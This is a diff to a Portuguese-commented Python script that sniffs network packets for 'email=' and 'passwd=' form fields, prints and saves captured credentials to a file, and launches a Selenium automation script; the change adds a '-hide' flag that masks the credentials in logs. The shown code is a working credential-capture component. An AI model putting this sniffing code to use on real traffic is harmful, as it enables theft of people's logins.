@@ -11,6 +11,9 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 ARQUIVO_SAIDA = os.path.join(BASE_DIR, "captura.txt")
 ARQUIVO_TEMP = os.path.join(BASE_DIR, "captura.tmp")
 
+# Verifica se o modo oculto está ativo
+HIDE_MODE = "-hide" in sys.argv
+
 # Tente localizar o python do venv dinamicamente ou use o caminho fixo
 if sys.prefix != sys.base_prefix:
     # Está rodando num venv
@@ -81,12 +84,18 @@ def processar(pacote):
                 if "email=" in data:
                     email_raw = data.split("email=", 1)[1].split("&")[0]
                     email = unquote(email_raw)
-                    print(f"[EMAIL]  {email}")
+                    if HIDE_MODE:
+                        sys.stdout.write(f"[EMAIL]  {'*' * 5} (OCULTO) {'*' * 5}\r\n")
+                    else:
+                        print(f"[EMAIL]  {email}")
 
                 if "passwd=" in data:
                     pass_raw = data.split("passwd=", 1)[1].split("&")[0]
                     senha = unquote(pass_raw)
-                    print(f"[PASSWD] {senha}")
+                    if HIDE_MODE:
+                        sys.stdout.write(f"[PASSWD] {'*' * 5} (OCULTO) {'*' * 5}\r\n")
+                    else:
+                        print(f"[PASSWD] {senha}")
 
                 # salva imediatamente no arquivo
                 salvar_credenciais(email, senha)
@@ -99,7 +108,9 @@ def processar(pacote):
 
 
 # --- INICIALIZAÇÃO ---
-print(f"[*] Iniciando automação Selenium (Dropando privilégios de root)...")
+print(f"[*] Iniciando automação Selenium")
+if HIDE_MODE:
+    print("[*] MODO PRIVACIDADE ATIVO: Credenciais serão ocultadas nos logs.")
 script_automacao = os.path.join(BASE_DIR, "selenium_automation.py")
 
 # Prepara a função de downgrade de permissão
@@ -127,15 +138,19 @@ if sudo_uid:
     except Exception as e:
         print(f"[!] Aviso: Não foi possível ajustar HOME do usuário: {e}")
 
+cmd = [python_exec, "-u", script_automacao]
+if HIDE_MODE:
+    cmd.append("-hide")
+
 proc = subprocess.Popen(
-    [python_exec, "-u", script_automacao],
+    cmd,
     stdout=subprocess.PIPE,
     stderr=subprocess.STDOUT,
     text=True,
     bufsize=1,
     preexec_fn=demote_fn,
     cwd=BASE_DIR,
-    env=env_corrigido  # <--- Passamos o ambiente com a HOME correta aqui
+    env=env_corrigido
 )
 
 t = threading.Thread(target=monitorar_logs_selenium, args=(proc,), daemon=True)
